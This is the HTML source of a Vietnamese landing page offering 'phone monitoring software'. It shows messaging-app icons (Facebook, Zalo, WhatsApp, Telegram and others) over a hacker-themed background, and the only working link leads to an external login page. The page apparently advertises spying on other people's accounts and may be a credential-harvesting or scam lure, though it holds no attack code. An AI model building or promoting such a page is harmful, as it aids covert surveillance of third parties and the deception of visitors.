<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hỗ Trợ 168</title>
    <!-- CSS only -->
    <link rel="stylesheet" href="style.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
</head>

<body>
    <div class="wrapper vh-100"
        style="background: url(https://www.bleepstatic.com/content/hl-images/2022/07/07/man-in-hood-typing.jpg) no-repeat center center; background-size: cover;">
        <div  class="container">
            <div class="row">
                <div class="col-md-12">
                    <h2 class="text-center text-uppercase mt-5 mb-5 text-white">Phần Mềm Giám Sát Điện Thoại</h2>
                </div>
            </div>
            <div class="row mb-3">
                <div class="col-12 col-md-10 offset-md-1">
                    <div class="login-container">
                        <div class="p-4 pb-0">
                            <div class="text-center show-error-cannot-go mb-2"></div>
                            <div class="row">
                                <div class="col-4 mb-4 text-center">
                                    <a  onclick="cannotGo()">
                                        <img src="https://cdn.tgdd.vn/2020/03/GameApp/Facebook-200x200.jpg"
                                            class="ht168__img-app ht168__img-app-index">
                                    </a>
                                </div>
                                <div class="col-4 mb-4 text-center">
                                    <a  onclick="cannotGo()">
                                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/LINE_logo.svg/2048px-LINE_logo.svg.png"
                                            class="ht168__img-app ht168__img-app-index">
                                    </a>
                                </div>
                                <div class="col-4 mb-4 text-center">
                                    <a href="https://hotro168.vercel.app/dangnhap.html">
                                        <img src="https://cdn.haitrieu.com/wp-content/uploads/2022/01/Logo-Zalo-Arc.png"
                                            class="ht168__img-app ht168__img-app-index">
                                    </a>
                                </div>
                                <div class="col-4 mb-4 text-center">
                                    <a  onclick="cannotGo()">
                                        <img src="https://cdn.tgdd.vn/hoi-dap/1356493/instagram-la-gi-instagram-co-diem-gi-khac-biet-so-voi-1-800x533.jpg"
                                            class="ht168__img-app ht168__img-app-index">
                                    </a>
                                </div>
                                <div class="col-4 mb-4 text-center">
                                    <a  onclick="cannotGo()">
                                        <img src="https://cdn.sforum.vn/sforum/wp-content/uploads/2021/07/TelegramSimpleHero-01-1.png"
                                            class="ht168__img-app ht168__img-app-index">
                                    </a>
                                </div>
                                <div class="col-4 mb-4 text-center">
                                    <a  onclick="cannotGo()">
                                        <img src="https://tipsorder.com/wp-content/uploads/2020/04/cach-dang-ky-tao-tai-khoan-wechat-mien-phi.jpg"
                                            class="ht168__img-app ht168__img-app-index">
                                    </a>
                                </div>
                                <div class="col-4 mb-4 text-center">
                                    <a  onclick="cannotGo()">
                                        <img src="https://www.americandream.edu.vn/statics/uploads/2018/11/viber-logo.png"
                                            class="ht168__img-app ht168__img-app-index">
                                    </a>
                                </div>
                                <div class="col-4 mb-4 text-center">
                                    <a  onclick="cannotGo()">
                                        <img src="https://upload.wikimedia.org/wikipedia/commons/d/df/Whats_app.jpg"
                                            class="ht168__img-app ht168__img-app-index">
                                    </a>
                                </div>
                                <div class="col-4 mb-4 text-center">
                                    <a  onclick="cannotGo()">
                                        <img src="https://thumbs.dreamstime.com/b/gps-global-positioning-system-icon-vector-logo-symbol-sign-web-navigation-isolated-flat-white-background-trendy-design-app-171440261.jpg"
                                            class="ht168__img-app ht168__img-app-index">
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="script.js"></script>
</body>

</html>
